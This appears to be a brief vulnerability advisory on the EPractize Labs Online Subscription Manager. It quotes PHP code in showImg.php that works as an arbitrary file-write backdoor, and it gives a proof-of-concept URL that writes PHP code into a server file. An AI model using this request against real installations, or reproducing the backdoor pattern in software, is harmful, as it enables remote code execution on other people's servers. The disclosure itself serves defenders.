EPractize Labs Online Subscription Manager

management. With Subscription Manager you can create subscription
forms, maintain subscription messages, send confirmation message
automatically, configure the subscription forms, load subscribers

showImg.php passes through img.jpg, but also runs the following code
as a trivial arbitrary file write back door.  It has nothing to do
with showing an image.

    <?php
    $reqOut="".$_GET['email'];
    $reqDB="".$_GET['db'];
    $in_fileStr = file_get_contents_me($reqDB);
    $count =substr_count($in_fileStr,$reqOut);
    if($count==0){
    $finalStr="".$in_fileStr."\n".$reqOut."#".$today = date("F j, Y, g:i a");
    $fT = @fopen($reqDB, 'wt');
    fwrite($fT, $finalStr);
    fclose($fT);
    }
    ?>

POC: showImg.php?db=me.php&email=<?echo "hello"; ?>
